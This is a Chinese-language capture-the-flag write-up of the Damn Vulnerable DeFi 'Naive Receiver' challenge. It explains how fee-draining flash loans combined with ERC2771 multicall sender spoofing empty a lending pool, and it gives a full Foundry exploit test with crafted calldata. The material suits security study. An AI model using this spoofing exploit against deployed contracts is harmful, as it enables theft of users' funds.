# Naive Receiver (24/08/31)

## 题目介绍

> **# 天真的接收器**
>
> **有一个余额为 1000 WETH 的资金池提供闪电贷款。其固定费用为 1 WETH。该池通过与无权限转发器合约集成，支持元交易。**
>
> **一位用户部署了一个余额为 10 WETH 的样本合约。看起来它可以执行 WETH 的闪电贷款。**
>
> **所有资金都有风险！从用户和池中解救所有 WETH，并将其存入指定的恢复账户。**

## 合约分析

一共有三个合约文件一个是池子合约提闪电贷功能，一个是转发器合约，还有接收者合约。下面这个是闪电贷的合约，

我们可以看见他的四个参数第一接收者，第二是token，第三数量，第四是data，这个data的话在这个函数里面是没有任何作用的。

首先验证这个token是不是weth，然后把资金转给接收者。接收者必须实现他的onfalshloan的一个接口，最后还款加上我们的手续费。

​    `    deposits[feeReceiver] += FIXED_FEE;`费用者加上所有的费用。

``` solidity
   function flashLoan(IERC3156FlashBorrower receiver, address token, uint256 amount, bytes calldata data)
        external
        returns (bool)
    {
        if (token != address(weth)) revert UnsupportedCurrency();

        // Transfer WETH and handle control to receiver
        weth.transfer(address(receiver), amount);
        totalDeposits -= amount;

        if (receiver.onFlashLoan(msg.sender, address(weth), amount, FIXED_FEE, data) != CALLBACK_SUCCESS) {
            revert CallbackFailed();
        }

        uint256 amountWithFee = amount + FIXED_FEE;
        weth.transferFrom(address(receiver), address(this), amountWithFee);
        totalDeposits += amountWithFee;

        deposits[feeReceiver] += FIXED_FEE;

        return true;
    }
```

我们可以先看一下初始化环境的一些配置，他有一个玩家，一个转发器还有一个pool，注意他的构造函数传入的`feeReceiver`是我们的部署者，trustedForwarder的地址是forwarder。

```solidity
    function setUp() public {
        //玩家
        (player, playerPk) = makeAddrAndKey("player");
        startHoax(deployer);

        //token
        weth = new WETH();

        //转发器
        forwarder = new BasicForwarder();

        //池子构造参数存入1000个eth
        pool = new NaiveReceiverPool{value: WETH_IN_POOL}(address(forwarder), payable(weth), deployer);

        //接收者
        receiver = new FlashLoanReceiver(address(pool));
        weth.deposit{value: WETH_IN_RECEIVER}();
        //接收者10个weth。
        weth.transfer(address(receiver), WETH_IN_RECEIVER);

        vm.stopPrank();
    }
```

整个合约我们其实能够利用的地方就是withdraw函数，他会从msgsender这个函数里面去取msg.data的后面20个字节。这个实际上是之前发生过的一个[任意地址欺骗攻击漏洞](https://blog.openzeppelin.com/arbitrary-address-spoofing-vulnerability-erc2771context-multicall-public-disclosure)问题。那么这个msg.sender我们可以从上面的闪电贷函数和初始化配置可以知道，msg.sender一定要是`feeReceiver`接收者就是部署者因为部署者最开始存入了1000个eth。并且费用接收者也是这个地址每次调用闪电贷函数结束的时候都会收到到手续费1个以太币。

```solidity
  function withdraw(uint256 amount, address payable receiver) external {
        // 重点msgsender();
        deposits[_msgSender()] -= amount;
        totalDeposits -= amount;

        // Transfer ETH to designated receiver
        weth.transfer(receiver, amount);
    }

    function deposit() external payable {
        _deposit(msg.value);
    }

    function _deposit(uint256 amount) private {
        weth.deposit{value: amount}();

        deposits[_msgSender()] += amount;
        totalDeposits += amount;
    }

    function _msgSender() internal view override returns (address) {
        if (msg.sender == trustedForwarder && msg.data.length >= 20) {
        //来源是信任地址，msgdata长度大于20.取最后20字节地址返回。
            return address(bytes20(msg.data[msg.data.length - 20:]));
        } else {
            return super._msgSender();
        }
    }
```

## 解题过程

我们只需要通过multicall去批量调用10次闪电贷让接收者合约的10个eth作为手续费金额累计添加到我们的部署者地址余额上面。和一次取钱的操作就可以完成攻击。我们可以看到最后验证通过的要求是recovery地址拥有所有的资金。所以取钱的时候目的地址指定到recovery地址即可。
` assertEq(weth.balanceOf(recovery), *WETH_IN_POOL* **+** *WETH_IN_RECEIVER*, "Not enough WETH in recovery account");`

因为上面的转发器任意地址欺骗的漏洞。`    return address(bytes20(**msg.data**[**msg.data**.length **-** *20***:**]))`取msg.data的最后20个字节的地址，就会取到我们下面这个已经构造的data的最后20个字节地址就是我们部署者的地址。部署者地址在构造的时候存入了1000ether，加上接收者的10 ether手续费。最后总共有1010ether会被转到recovery地址。

> 0x00f714ce000000000000000000000000000000000000000000000036c090d0ca6888000000000000000000000000000073030b99950fb19c6a813465e58a0bca5487fbea000000000000000000000000ae0bdc4eeac5e950b67c6819b118761caaf61946

最后的poc

``````solidity
    function test_naiveReceiver() public checkSolvedByPlayer {
        bytes[] memory calldatas=new bytes[](11);
        //10次闪电贷
        for(uint256 i=0;i<10;i++){
            calldatas[i]=abi.encodeCall(NaiveReceiverPool.flashLoan,(receiver,address(weth),0,"0x"));
        }
        //取钱
        calldatas[10]=abi.encodePacked(abi.encodeCall(pool.withdraw,(1010 ether,payable(recovery))),
            bytes32(uint256(uint160(address(deployer)))));
        //批量调用
        bytes memory calldatass=abi.encodeCall(pool.multicall,calldatas);
        emit log_Data(calldatass);
        BasicForwarder.Request memory request = BasicForwarder.Request({
        from: player,
        target: address(pool),
        value: 0,
        gas: 300000000,
        nonce: forwarder.nonces(player),
        data: calldatass,
        deadline: block.timestamp + 1000000
        });
        bytes32 requestHash=forwarder.getDataHash(request);
        bytes32 requestHashs = keccak256(
                abi.encodePacked(
                    "\x19\x01",
                    forwarder.domainSeparator(),
                    requestHash
                )
            );
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, requestHashs);
        bytes memory signatures = abi.encodePacked(r, s, v); 
        //执行攻击
        forwarder.execute{value:0 ether }(request, signatures);
    }
``````

